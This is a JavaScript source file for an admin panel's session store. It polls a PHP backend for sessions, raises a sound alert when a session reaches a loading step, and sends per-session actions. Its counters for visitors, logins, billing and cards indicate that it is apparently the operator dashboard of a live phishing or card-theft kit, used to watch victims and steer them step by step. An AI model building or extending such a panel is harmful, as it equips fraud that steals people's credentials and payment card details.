import { defineStore } from 'pinia'
import { ref } from 'vue'
import { playAlert } from '@/commands/sound'

const API = '/panel/api.php'

async function api(action, params = {}, method = 'GET') {
  const url = new URL(API, location.origin)
  url.searchParams.set('a', action)
  if (method === 'GET') {
    Object.entries(params).forEach(([k, v]) => url.searchParams.set(k, v))
    const r = await fetch(url, { credentials: 'include' })
    return r.json()
  }
  const fd = new FormData()
  Object.entries(params).forEach(([k, v]) => fd.append(k, v))
  const r = await fetch(url, { method: 'POST', body: fd, credentials: 'include' })
  return r.json()
}

export const useSessionsStore = defineStore('sessions', () => {
  const sessions = ref([])
  const stats = ref({ visitors: 0, logins: 0, billing: 0, cards: 0, complete: 0 })
  const currentSession = ref(null)
  const prevAlertIds = ref([])
  let pollInterval = null

  async function fetchSessions() {
    const data = await api('sessions')
    const waitingIds = data.filter(s => ['loading', 'page_loading'].includes(s.current_step)).map(s => s.id)
    const fresh = waitingIds.filter(id => !prevAlertIds.value.includes(id))
    if (fresh.length) playAlert()
    prevAlertIds.value = waitingIds
    sessions.value = data
  }

  async function fetchStats(filter = 'all') {
    stats.value = await api('stats', { f: filter })
  }

  async function fetchSession(id) {
    currentSession.value = await api('session', { id })
  }

  async function sendAction(id, type, extra = {}) {
    await api('action', { id, type, ...extra }, 'POST')
  }

  function startPolling(fn, ms = 3000) {
    stopPolling()
    fn()
    pollInterval = setInterval(fn, ms)
  }

  function stopPolling() {
    if (pollInterval) { clearInterval(pollInterval); pollInterval = null }
  }

  return { sessions, stats, currentSession, fetchSessions, fetchStats, fetchSession, sendAction, startPolling, stopPolling }
})

export async function login(password) {
  const r = await api('login', { password }, 'POST')
  if (r.ok) { window.__PANEL_AUTH__ = true; return true }
  return false
}

export async function logout() {
  await api('logout')
  window.__PANEL_AUTH__ = false
}

export async function changePassword(current, newPw) {
  return api('password', { current, new: newPw }, 'POST')
}
